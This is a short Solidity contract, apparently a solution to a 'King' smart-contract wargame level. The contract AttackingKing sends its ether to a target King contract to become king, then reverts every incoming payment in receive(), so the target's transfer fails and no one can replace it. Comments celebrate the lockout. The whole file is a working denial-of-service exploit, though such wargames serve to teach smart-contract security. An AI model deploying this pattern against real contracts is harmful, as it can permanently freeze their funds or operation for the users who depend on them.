// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // `call` so we forward enough gas
        contractAddress.call{value: address(this).balance}("");
    }

     receive() external payable {
      // Gottem! When `King` transfers a value back to this contract, it will
      // always revert. Since it uses `transfer`, an error is thrown and `King` does not check for this condition
      // so it will always revert that transaction actual, effectively locking the king of the contract
      revert("Now I am become death, the destroyer of worlds");
     }
}
